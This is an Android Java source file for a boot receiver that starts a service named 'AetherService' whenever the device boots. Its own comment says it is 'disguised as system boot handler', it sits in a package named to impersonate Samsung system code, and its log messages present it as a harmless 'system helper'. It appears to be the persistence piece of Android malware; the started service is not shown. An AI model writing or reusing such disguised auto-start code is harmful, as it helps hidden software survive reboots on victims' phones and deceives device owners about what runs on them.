package com.samsung.android.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Boot Receiver - Auto start service on device boot
 * Disguised as system boot handler
 */
public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "SystemBoot";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction())) {
            
            Log.d(TAG, "Boot completed - starting system helper");
            
            // Start the service
            Intent serviceIntent = new Intent(context, AetherService.class);
            context.startForegroundService(serviceIntent);
        }
    }
}